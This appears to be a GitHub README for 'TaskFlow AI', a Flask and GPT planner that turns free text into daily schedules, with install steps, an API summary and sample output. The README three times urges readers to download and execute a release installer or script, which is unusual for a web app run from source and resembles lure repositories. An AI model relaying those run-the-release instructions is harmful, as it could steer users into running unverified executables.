[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/rk1014/taskflow-ai/releases)

# TaskFlow AI — Intelligent Planner with GPT, Flask, Voice

![TaskFlow UI](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1400&q=80)

TaskFlow AI converts plain-language plans into prioritized daily schedules. It uses Flask and OpenAI GPT to parse tasks, assign categories, estimate time, and produce an optimal plan. The app supports voice input, dark mode, and responsive design with Tailwind CSS. It targets users who manage tasks, time, and daily flow.

Badges
- ![Python](https://img.shields.io/badge/Python-3.10+-blue)
- ![Flask](https://img.shields.io/badge/Flask-2.x-lightgrey)
- ![OpenAI](https://img.shields.io/badge/OpenAI-GPT-orange)
- ![TailwindCSS](https://img.shields.io/badge/TailwindCSS-v3.0-blue)
- ![License](https://img.shields.io/badge/License-MIT-green)

Topics
ai · api · daily-planner · flask · gpt · javascript · openai · productivity · python · responsive-design · tailwind-css · task-management · time-management · voice-input · web-application

Quick links
- Releases and downloadable assets: https://github.com/rk1014/taskflow-ai/releases  
  Download the release file from that page and execute it per the package README.

Why TaskFlow AI
- Turn a paragraph into an executable plan.
- Group tasks by context and priority.
- Produce time estimates and block the calendar.
- Use voice input when typing slows you down.
- Work in light or dark mode across screens.

Screenshots
- Web app layout: https://images.unsplash.com/photo-1557800636-894a64c1696f?auto=format&fit=crop&w=1400&q=80
- Mobile layout: https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=800&q=80

Table of contents
- Features
- Architecture
- Getting started
- Install (local)
- Configuration
- Usage
- API reference
- Frontend notes
- Data model
- Voice input
- Theming
- Deployment
- Development and contribution
- Roadmap
- Releases
- License

Features
- Natural language parsing: Convert a free-text plan into discrete tasks.
- Prioritization: Assign priority using a rule-based and ML-backed approach.
- Time estimates: Produce minutes or hours per task, with total day estimate.
- Scheduling: Suggest an ordered schedule with time blocks.
- Categories: Work, Personal, Errands, Calls, Deep Work, Learning.
- Voice input: Capture tasks by speech and transcribe to text.
- Responsive UI: Mobile-first design built with Tailwind CSS.
- Dark mode: Persist theme per user settings.
- Export: Generate JSON, CSV, and iCal for calendar import.

Architecture overview
- Backend
  - Flask API
  - OpenAI GPT integration for parsing and intent extraction
  - Task planner service that computes estimates and slots
  - SQLite or PostgreSQL for persistence
- Frontend
  - Single-page app with vanilla JS and Tailwind CSS
  - Voice capture via Web Speech API
  - Responsive components and dark theme toggles
- Deployment
  - Container-ready (Dockerfile)
  - Optional uWSGI + Nginx stack for production

Getting started (local dev)
Prerequisites
- Python 3.10 or later
- Node.js 16+ (for frontend build tasks, optional)
- pip and virtualenv
- OpenAI API key

Install (backend)
1. Clone the repo
   git clone https://github.com/rk1014/taskflow-ai.git
2. Create a virtual env and activate it
   python -m venv .venv
   source .venv/bin/activate
3. Install Python dependencies
   pip install -r requirements.txt

Install (frontend)
1. cd frontend
2. npm install
3. npm run dev

Run (development)
- Start backend
  FLASK_APP=app.py FLASK_ENV=development flask run
- Start frontend (if separate)
  cd frontend
  npm run dev
- Open http://localhost:5000 or the port shown by the dev server

Configuration
- Create a .env file in the root with:
  OPENAI_API_KEY=sk-...
  FLASK_ENV=development
  DATABASE_URL=sqlite:///taskflow.db
  SECRET_KEY=your-secret-key
- Adjust ports and host in config.py for production.

Execution of release asset
- The releases page hosts packaged builds and installers. Download the release file from https://github.com/rk1014/taskflow-ai/releases and execute it according to the included instructions. The release_asset will contain a README or run script. Follow that file to run the app outside development mode.

API reference (summary)
- POST /api/plan
  - Body: { "text": "My plan for today..." }
  - Response: { "tasks": [...], "schedule": [...], "summary": {...} }
- GET /api/tasks
  - Returns stored tasks for the current user
- POST /api/voice
  - Accepts WAV/MP3 or raw transcript
- POST /api/export
  - Body: { "format": "json|csv|ical" }

Task model (example)
- id: uuid
- title: string
- description: string
- category: enum[Work, Personal, Errands, Call, Learning]
- priority: int (1 highest - 5 lowest)
- estimated_minutes: int
- scheduled_start: datetime optional
- duration_minutes: int optional
- source: enum[manual, gpt, voice]

Planner logic
- Parse text into named tasks and times with GPT.
- Assign categories by keyword matching and GPT intent tags.
- Estimate time by mapping task type to typical durations and adjusting by user history.
- Order tasks by priority, time window, and estimated effort.
- Fill the schedule with focus blocks and short breaks.

Voice input
- Frontend uses the Web Speech API for browsers that support it.
- The app falls back to manual typing if the API is unavailable.
- Captured speech posts to /api/voice for transcription validation and merging.
- The backend re-runs parsing on the transcribed text to produce tasks.

Theming and responsive design
- Tailwind CSS drives layout and utility classes.
- The UI uses CSS variables to toggle between light and dark palettes.
- The layout uses a mobile-first grid that adapts to large screens.
- Components include task cards, schedule timeline, voice recorder, and settings.

Security and rate limits
- Protect API endpoints with a session token or JWT.
- Configure OpenAI calls on the server to avoid exposing the API key.
- Apply request rate limiting to the /api/plan endpoint in production.

Sample usage scenarios
- Morning planning: Paste a paragraph of tasks and get a schedule for the day.
- Running errands: Give a list and receive a grouped plan that reduces travel.
- Work sprints: Define 3 deep work tasks and get a focused calendar with breaks.
- Time audit: Track estimates vs. actuals and adjust future estimates.

Examples

Input
I need to finish the client proposal, call the bank, pick up laundry, run a 30-minute workout, and read two chapters of the book.

API call
POST /api/plan
Body: { "text": "<input above>" }

Response (excerpt)
{
  "tasks": [
    { "title": "Client proposal", "priority": 1, "estimated_minutes": 120, "category": "Work" },
    { "title": "Call bank", "priority": 2, "estimated_minutes": 15, "category": "Call" },
    { "title": "Pick up laundry", "priority": 3, "estimated_minutes": 30, "category": "Errands" },
    { "title": "Workout", "priority": 2, "estimated_minutes": 30, "category": "Personal" },
    { "title": "Read book", "priority": 4, "estimated_minutes": 60, "category": "Learning" }
  ],
  "schedule": [
    { "start": "09:00", "task": "Client proposal", "duration": 120 },
    { "start": "11:30", "task": "Call bank", "duration": 15 },
    { "start": "11:45", "task": "Pick up laundry", "duration": 30 },
    { "start": "13:00", "task": "Workout", "duration": 30 },
    { "start": "14:00", "task": "Read book", "duration": 60 }
  ]
}

Deployment
- Use Docker for consistent environments.
- Example Dockerfile and docker-compose.yml exist in the repo.
- For production, run behind Nginx with uWSGI or Gunicorn.
- Configure environment variables on the host or via a secret manager.

CI and testing
- Unit tests use pytest for backend logic and mock OpenAI calls.
- Frontend tests use basic integration checks with Playwright or Cypress.
- CI uses GitHub Actions that run tests and build releases.

Contributing
- Fork the repo and create a feature branch.
- Make small, focused commits.
- Add tests for new planner logic.
- Open a pull request with a clear description and examples.
- Follow the code style in .editorconfig and use black for Python.

Roadmap
- Add multi-day planning and recurring tasks.
- Improve learning: adapt time estimates from user history.
- Calendar sync: two-way sync with Google Calendar and Outlook.
- Collaboration: share plans with teammates.
- Mobile PWA with offline support.

Releases
- Download the packaged builds from https://github.com/rk1014/taskflow-ai/releases and execute the included installer or script. The release asset includes run instructions and any bundled dependencies. If you cannot access the link, check the "Releases" section on the repository page.

License
MIT License. See LICENSE file for full terms.

Credits and links
- OpenAI GPT for natural language parsing
- Flask for the backend API
- Tailwind CSS for styling
- Web Speech API for browser voice capture

Contact
- Issues and feature requests: open an issue in the repo.
- Pull requests: open a PR against main with tests and description.

Thank you for exploring TaskFlow AI

